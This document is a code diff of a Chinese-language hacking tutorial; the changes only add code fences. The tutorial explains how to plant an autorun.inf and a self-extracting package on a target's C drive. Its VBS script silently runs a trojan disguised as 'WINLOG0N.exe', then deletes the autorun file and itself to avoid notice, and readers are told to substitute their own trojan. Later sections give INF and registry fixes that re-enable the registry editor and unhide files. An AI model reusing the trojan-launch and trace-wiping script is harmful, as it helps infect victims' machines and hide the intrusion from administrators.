@@ -56,13 +56,13 @@ shellAutocommand=AutoRun.exe
 这样,你把它保存为一个.inf文件,放在C盘下,AutoRun.exe为你指定的运行程序.这样双击C盘就可以成功运行了.前面还说过一个问题,就是C盘打不开,很容易就被管理员发现了,有待改进.下来就说怎么解决这个问题,GO ON!
 
 其实这个实现起来也不难,先把Autoruninf上传至对方C盘,我们可以做一个自解压包,也放在C盘根目录下,让他成为我们的指定运行文件,里面包含我们要运行的程序,比如木马,还一个VBS脚本,自解压包执行后先让他执行VBS脚本,内容如下:
-
+```
 set yu=wscript.createobject("wscript.shell")
 yu.run "cmd /c start WINLOG0N.exe",0
 yu.run "cmd /c del Autoruninf",0
 yu.run "cmd /c start c:",0
 yu.run "cmd /c del AutoRun.vbs",0
-
+```
 我再简单解释下,解压后VBS帮我们运行winlogon.exe(我配置好的木马),然后删掉Autoruninf,为什么要删掉它,第一,减少被发 现的机会,二,删掉它,管理员重启机子或注销后如果右键点击盘复符不会出现"播放",一切恢复中马前的状态,当然之前我们的木马已经运行了.第四行代码: 我们为他打开C盘,最后再删掉vbs脚本自身.
 
 这样改进后个人觉得安全性大大提高了.呵呵..各位在测试的时候只须把上面脚本中的 WINLOG0N.exe改为自己的木马就可以了.winxp sp2下测试成功。
@@ -107,6 +107,7 @@ del Autoruninf
 假如"运行"被禁止掉那么请用下面介绍的方法
 
 注册表编辑器已被禁用，我们用INF文件来解除。那么我们可以在记事本里写入下面的内容：
+```
 [Version]
 Signature="$Windows NT$"
 
@@ -116,7 +117,7 @@ ADDREG=Myadd
 [Myadd]
 ;解禁注册表编辑器
 HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools,1,0
-
+```
 然后把文件另存为一个INF文件，右击文件----点“安装”就可以啦^O^
 我们可以看到第一个语段，在Signature后面的签名"$Windows NT$"它是指明我的操作系统是NT的，如果你的操作系统是98的在后面的签名中应该写"$CHICAGO$"。
 再看第二个语段，等号左边的“ADDREG”是不能更改的，等号右边的内容就随你的心情啦，但是有一点要注意，就是要与在第三个语段中使用的语句保持一致。另外还有一项操作是“DELREG”(删除键)和“ADDREG”的用法一样，后面介绍。
@@ -127,6 +128,7 @@ HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools,1
 在具体修改注册表键值语段的格式为：根键，子键，键名，键类型，键值(注：中间的逗号不能省略)。
 上面这个文件中我们知道其实要修改的是DisableRegistryTools键，把它的值改为“0”。它的类型为DWORD(双字节)，在INF文件 有关注册表的操作中有字符串类型(用“0”表示)和二进制类型(用“1”表示)，在网上没有找到INF文件表示双字节类型的资料，望知道的人补充。在这里 我们直接用二进制类型就可以了，所以大家看到在键类型的位置上是个“1”，最后是要修改的键值“0”。
 前面提到“DELREG”它是删除键值的操作，如果要想把DisableRegistryTools键删除的话可以这样写：
+```
 [Version]
 Signature="$Windows NT$"
 
@@ -136,11 +138,12 @@ DELREG=Mydel
 [Mydel]
 ;删除DisableRegistryTools键
 HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools
-
+```
 就是省略掉键类型和键值字段，最后把这个文件另存为一个INF文件，右击文件----点“安装”就可以了。
 好了，不知道各位看观是不是看明白了，没看明白也没关系，我写了一个，大家只要把下面的内容复制到记事本中，然后把这个文件另存为一个INF文件，最后右 击文件----点“安装”就可以了。(注：这个文件可以解决前文中所提到问题，只能在NT系统中使用，主页会被改成20CN的首页，嘻嘻做个广告啦 ^O^)。
 
 -----------------------------------------------------------------------------------
+```
 [Version]
 Signature="$Windows NT$"
 
@@ -150,12 +153,13 @@ ADDREG=Myadd
 [Myadd]
 ;解禁注册表编辑器
 HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools,1,0
+```
 2。显示出被隐藏的系统文件
 
 运行——regedit
-
+```
 HKEY_LOCAL_MACHINESoftwareMicrosoftwindowsCurrentVersionexplorerAdvancedFolderHiddenSHOWALL，将CheckedValue键值修改为1
-
+```
 这里要注意，病毒会把本来有效的DWORD值CheckedValue删除掉，新建了一个无效的字符串值CheckedValue，并且把键值改为0！我 们将这个改为1是毫无作用的。（有部分病毒变种会直接把这个CheckedValue给删掉，只需和下面一样，自己再重新建一个就可以了）
 
 方法：删除此CheckedValue键值，单击右键 新建——Dword值——命名为CheckedValue，然后修改它的键值为1，这样就可以选择“显示所有隐藏文件”和“显示系统文件”。
